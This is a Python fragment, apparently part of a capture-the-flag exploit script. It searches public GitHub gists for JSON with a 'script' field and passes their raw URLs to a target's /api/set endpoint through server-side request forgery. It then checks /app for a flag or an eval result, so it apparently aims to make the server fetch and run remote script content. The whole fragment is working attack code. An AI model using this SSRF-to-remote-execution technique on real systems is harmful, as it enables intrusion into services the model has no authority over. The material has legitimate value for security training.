# Try using GitHub Gist API directly
# Let's search for gists with "script" in the filename
print("\n[+] Searching GitHub gists with 'script' in content...")
search_url = "https://api.github.com/gists"
try:
    # Get public gists
    r = requests.get(search_url, params={"per_page": 100}, timeout=10)
    if r.status_code == 200:
        gists = r.json()
        for gist in gists:
            files = gist.get('files', {})
            for fname, fdata in files.items():
                # Check if content is a JSON with "script" field
                content = fdata.get('content', '')
                if '{' in content and '"script"' in content:
                    print(f"[!!] Found gist with 'script' field: {gist['id']}")
                    print(f"[+] Filename: {fname}")
                    print(f"[+] Content preview: {content[:100]}")
                    raw_url = fdata.get('raw_url')
                    print(f"[+] Raw URL: {raw_url}")
                    
                    # Try this URL
                    print("\n[+] Testing with SSRF...")
                    set_url = f"{target}/api/set?url={urllib.parse.quote(raw_url)}"
                    r2 = requests.get(set_url)
                    print(f"[+] Set: {r2.text}")
                    
                    r3 = requests.get(f"{target}/app")
                    print(f"[+] App status: {r3.status_code}")
                    if "FLAG" in r3.text or "eval_result" in r3.text or "flag{" in r3.text.lower():
                        print(f"[!!!] SUCCESS!")
                        print(r3.text)
                    else:
                        print(f"[+] Response: {r3.text[:1500]}")
                    break
except Exception as e:
    print(f"[+] gist search error: {e}")

